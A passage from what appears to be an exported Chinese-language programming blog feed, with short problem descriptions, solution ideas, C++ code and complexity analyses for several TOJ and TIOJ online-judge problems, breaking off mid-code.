<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">if</span>(n&lt;<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;-n&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TIOJ 2054</title>
    <url>/2020/09/25/TIOJ2054/</url>
    <content><![CDATA[<h1 id="TIOJ-2054"><a href="#TIOJ-2054" class="headerlink" title="TIOJ 2054"></a>TIOJ 2054</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://tioj.ck.tp.edu.tw/problems/2054" target="_blank" rel="noopener">https://tioj.ck.tp.edu.tw/problems/2054</a><br>二維 slide window 問題<br>給定一個長方形的寬與高，以及一個平面座標上的多個點座標<br>問該長方形最多能涵蓋多少點座標</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果是一維的，也就是長方形的高是無限大的情況<br>我們只需要維護左界與右界，每次看看下一個點加入後右界與左界的距離有沒有超過寬<br>只需要 $O(N)$ 就可以知道最多有多少點了</p>
<p>那如果今天的情況是長方形的寬是無限大的情況呢?<br>同樣，我們也只需要維護左界與右界，每次看看下一個點加入後右介宇左界的距離有沒有超過高<br>同樣只需要 $O(N)$ 就可以知道有多少點</p>
<p>今天的狀況是二維，概念仍然相同<br>我們先將座標們以<strong>x座標優先，y座標其次</strong>的排序<br>在維護左右界的同時，也看看這些座標依照<strong>y座標優先，x座標其次</strong>的排序後，哪些還符合<br>同樣掃過去即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,l,w;</span><br><span class="line"><span class="built_in">vector</span>&lt;pii&gt; v;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> L=<span class="number">0</span>,R=<span class="number">0</span> ; L&lt;n &amp;&amp; R&lt;n ; )&#123;</span><br><span class="line">		<span class="keyword">if</span>(L==R)&#123;</span><br><span class="line">			res=max(res,<span class="number">1</span>);</span><br><span class="line">			R++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(v[R].first-v[L].first&gt;w)&#123;</span><br><span class="line">			L++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">vector</span>&lt;pii&gt; tmp;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=L ; i&lt;=R ; i++)&#123;</span><br><span class="line">				tmp.emplace_back(v[i].second,v[i].first);</span><br><span class="line">			&#125;</span><br><span class="line">			sort(tmp.begin(),tmp.end());</span><br><span class="line">			<span class="keyword">int</span> m=tmp.size();</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> D=<span class="number">0</span>,T=<span class="number">0</span> ; D&lt;m &amp;&amp; T&lt;m ; )&#123;</span><br><span class="line">				<span class="keyword">if</span>(D==T)&#123;</span><br><span class="line">					T++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(tmp[T].first-tmp[D].first&gt;l)&#123;</span><br><span class="line">					D++; </span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					res=max(res,T-D+<span class="number">1</span>);</span><br><span class="line">					T++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			R++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l&gt;&gt;w;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,x,y ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">		v.emplace_back(x,y);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(v.begin(),v.end());</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;solve()&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>橫向與直向皆約為 $O(N)$<br>總複雜度 $O(N^2)$</p>
]]></content>
      <categories>
        <category>TIOJ</category>
      </categories>
      <tags>
        <tag>TIOJ</tag>
        <tag>slide window</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 533</title>
    <url>/2021/03/23/TOJ533/</url>
    <content><![CDATA[<h1 id="TOJ-533"><a href="#TOJ-533" class="headerlink" title="TOJ 533"></a>TOJ 533</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/533/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/533/</a></p>
<p>判斷 $n$ 是否介在 $a, b$ 之間</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,n;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;n;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;=n &amp;&amp; b&gt;=n) <span class="built_in">cout</span>&lt;&lt;<span class="string">"yes\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"no\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 532</title>
    <url>/2021/03/23/TOJ532/</url>
    <content><![CDATA[<h1 id="TOJ-532"><a href="#TOJ-532" class="headerlink" title="TOJ 532"></a>TOJ 532</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/532/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/532/</a></p>
<p>輸出 $p, q$ 當中 2 的倍數以及 3 的倍數分別有幾個數字</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> p,q,a=<span class="number">0</span>,b=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;p&gt;&gt;q;</span><br><span class="line">	<span class="keyword">if</span>(p%<span class="number">2</span>==<span class="number">0</span>) a++;</span><br><span class="line">	<span class="keyword">if</span>(p%<span class="number">3</span>==<span class="number">0</span>) b++;</span><br><span class="line">	<span class="keyword">if</span>(q%<span class="number">2</span>==<span class="number">0</span>) a++;</span><br><span class="line">	<span class="keyword">if</span>(q%<span class="number">3</span>==<span class="number">0</span>) b++;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">" "</span>&lt;&lt;b&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 531</title>
    <url>/2021/03/23/TOJ531/</url>
    <content><![CDATA[<h1 id="TOJ-531"><a href="#TOJ-531" class="headerlink" title="TOJ 531"></a>TOJ 531</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/531/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/531/</a></p>
<p>判斷 $m&gt;n$ 是否成立</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">if</span>(m&gt;n) <span class="built_in">cout</span>&lt;&lt;<span class="string">"true\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"false\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 534</title>
    <url>/2021/03/23/TOJ534/</url>
    <content><![CDATA[<h1 id="TOJ-534"><a href="#TOJ-534" class="headerlink" title="TOJ 534"></a>TOJ 534</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/534/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/534/</a></p>
<p>詢問 $a, b$ 是否同為奇數或同為偶數</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a%<span class="number">2</span>==b%<span class="number">2</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"yes\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"no\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 535</title>
    <url>/2021/03/23/TOJ535/</url>
    <content><![CDATA[<h1 id="TOJ-535"><a href="#TOJ-535" class="headerlink" title="TOJ 535"></a>TOJ 535</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/535/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/535/</a></p>
<p>判斷輸入的整數 $n$ 介在哪個範圍，並輸出相對應內容</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">100</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"S\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">90</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"A\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">80</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"B\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">70</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"C\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">60</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"D\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"F\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 556</title>
    <url>/2021/03/23/TOJ556/</url>
    <content><![CDATA[<h1 id="TOJ-556"><a href="#TOJ-556" class="headerlink" title="TOJ 556"></a>TOJ 556</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/556/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/556/</a></p>
<p>有 $N$ 項工作，為了好好管理進度，我們把每一份工作都分成了 $K$ 份</p>
<p>對於第 $i$ 項工作每天可以完成 $a_i$ 份，並且每天都會做每一項工作</p>
<p>因為怕工作會做不完，我們有 $M$ 筆經費可以將工作外包</p>
<p>每一經費對於第 $i$ 項工作可以將其中的 $b_i$ 份工作外包，並且不需考慮外包的作業時間</p>
<p>請問在最佳分配經費的情況下，最少可以在幾天之內完成 $N$ 份工作</p>
<p>$$<br>1 \leq N \leq 10^5\<br>1 \leq K \leq 10^9\<br>0 \leq M \leq 10^9\<br>1 \leq a_i \leq 10^9\<br>1 \leq b_i \leq 10^9<br>$$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果說 $X$ 天可以把工作處理完成，那麼 $X+1$ 天也一定可以</p>
<p>發現到天數是具有單調性的，那麼要求最小的天數就可以用二分搜來完成</p>
<p>二分搜最小所需要的天數 $X$，確認 $X$ 是否可行來調整左界與右界</p>
<p>那麼要怎麼確認 $X$ 天能不能完成呢?</p>
<p>我們可以把每一項工作都先減去 $X$ 天自己做可以完成的工作量</p>
<p>那麼剩下的所有工作就必須要外包才能完成了</p>
<p>最後計算需要外包的數量，就可以判斷是否可以在 $X$ 天完成了!</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n, k, m, L=<span class="number">0</span>, R=<span class="number">1e9</span>+<span class="number">10</span>, A[<span class="number">100005</span>], B[<span class="number">100005</span>], tmp[<span class="number">100005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">search</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> l, <span class="keyword">long</span> <span class="keyword">long</span> r, <span class="keyword">long</span> <span class="keyword">long</span> p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> mid = (l+r)/<span class="number">2</span>, cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="comment">// 先扣除 mid 天可以自己完成的工作量</span></span><br><span class="line">			tmp[i] = k - A[i]*mid;</span><br><span class="line">			<span class="keyword">if</span>(tmp[i] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="comment">// 剩下的全部外包</span></span><br><span class="line">				cnt += tmp[i]/B[i];</span><br><span class="line">				<span class="keyword">if</span>(tmp[i] % B[i] &gt; <span class="number">0</span>) cnt++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(cnt &gt; p) l = mid + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r = mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;A[i];</span><br><span class="line">		R = min(R, A[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;B[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 最大工作天數為 (工作份數K / 一天處理最小的工作量)</span></span><br><span class="line">	R = k/R + <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;search(L, R, m)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>二分搜的右界為 $R’ = k / min(R) + 1$</p>
<p>搜尋時間複雜度為 $O(nlog{R’})$</p>
<p>總時間複雜度為 $O(n + nlog{R’})$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
        <tag>Binary Search</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 55</title>
    <url>/2021/04/01/TOJ55/</url>
    <content><![CDATA[<h1 id="TOJ-55"><a href="#TOJ-55" class="headerlink" title="TOJ 55"></a>TOJ 55</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/55/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/55/</a></p>
<p>輸入 $n$ 個數字，接下來有 $m$ 筆詢問，想知道詢問的數字 $q$ 在序列當中出現的次數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接計算 upper_bound ($&gt;q$ 的第一個位置) - lower_bound ($\leq q$ 的第一個位置)</p>
<p>因為這一題的輸入數量有點大，需要加上輸入優化</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, arr[<span class="number">1000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// 輸入優化</span></span><br><span class="line">	ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">	<span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr, arr+n);</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>, q ; i&lt;m ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;q;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;upper_bound(arr, arr+n, q) - lower_bound(arr, arr+n, q)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序時間複雜度為 $O(nlogn)$</p>
<p>二分搜時間複雜度為 $O(logn)$</p>
<p>總時間複雜度約為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
        <tag>Binary Search</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 536</title>
    <url>/2021/03/23/TOJ536/</url>
    <content><![CDATA[<h1 id="TOJ-536"><a href="#TOJ-536" class="headerlink" title="TOJ 536"></a>TOJ 536</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/536/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/536/</a></p>
<p>輸入艦艇以及魚雷的左界右界的座標，判斷艦艇是否可以被魚雷打到</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>魚雷可以打到艦艇的情況有 2 種</p>
<p>一種是魚雷的範圍直接包含的艦艇</p>
<p>一種是魚雷的範圍包含了部分的艦艇</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m,p,q;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;p&gt;&gt;q;</span><br><span class="line">	<span class="keyword">if</span>((p&lt;=n &amp;&amp; q&gt;=m) || (p&lt;=m &amp;&amp; p&gt;=n) || (q&lt;=m &amp;&amp; q&gt;=n))</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"yes\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"no\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 564</title>
    <url>/2020/09/18/TOJ564/</url>
    <content><![CDATA[<h1 id="TOJ-564"><a href="#TOJ-564" class="headerlink" title="TOJ 564"></a>TOJ 564</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/564/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/564/</a><br>給一個序列，如果求該敘列有多少種回文排列方式</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果說序列中相同元素各數有一種以上是奇數，可以保證一定無解<br>因為要排成回文，我們可以只看一半，而另一半的答案會隨之確定<br>其他情況下，將所有相同數字的元素數量切半來看，排列好<br>最後將不同數字排列，就可以獲得答案</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[N],cnt[N],ans=<span class="number">1</span>,odd=<span class="number">0</span>,diff=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">p</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret=<span class="number">1</span>;</span><br><span class="line">	y++;</span><br><span class="line">	<span class="keyword">while</span>(y&lt;=x)&#123;</span><br><span class="line">		ret*=y;</span><br><span class="line">		ret%=mod;</span><br><span class="line">		y++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span 